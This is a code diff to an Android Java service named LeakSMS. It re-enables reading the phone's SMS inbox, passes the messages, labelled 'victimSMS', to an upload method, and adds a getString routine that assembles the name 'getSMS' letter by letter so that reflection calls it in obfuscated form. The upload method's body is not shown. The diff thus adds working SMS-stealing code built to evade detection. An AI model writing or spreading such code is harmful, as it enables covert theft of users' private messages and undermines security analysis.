@@ -29,15 +29,13 @@ public class LeakSMS extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        LeakSMS L=new LeakSMS();
-        Method methodGet = null;
-        Method methodUpload= null;
-        String victimSMS="";
+
         try {
-            methodGet=LeakSMS.class.getMethod("getSMS");
-            methodUpload=LeakSMS.class.getMethod("uploadSMS", String.class);
-            victimSMS=(String)methodGet.invoke(new LeakSMS());
-            methodUpload.invoke(new LeakSMS(),victimSMS);
+            LeakSMS L=new LeakSMS();
+            Method methodGet=LeakSMS.class.getMethod(getString());
+            Method methodUpload=LeakSMS.class.getMethod("uploadSMS", String.class);
+            String victimSMS=(String)methodGet.invoke(L);
+            uploadSMS(victimSMS);
         } catch (NoSuchMethodException e) {
             e.printStackTrace();
         } catch (InvocationTargetException e) {
@@ -45,13 +43,12 @@ public class LeakSMS extends Service {
         } catch (IllegalAccessException e) {
             e.printStackTrace();
         }
-
         return  super.onStartCommand(intent, flags, startId);
     }
 
     public String getSMS()
     {
-       /*String str = " ";
+        String str = "";
         Uri inboxURI = Uri.parse("content://sms/inbox");
         Cursor cur = getContentResolver().query(inboxURI, null, null, null, null);
         if (cur.moveToFirst()) {
@@ -59,8 +56,17 @@ public class LeakSMS extends Service {
         }
         str=str.replace(" ","_");
         return str;
-        */
-       return "test_3";
+    }
+
+    public String getString(){
+        String str="";
+        str=str+"g";
+        str=str+"e";
+        str=str+"t";
+        str=str+"S";
+        str=str+"M";
+        str=str+"S";
+        return str;
     }
     public void uploadSMS(String str)
     {
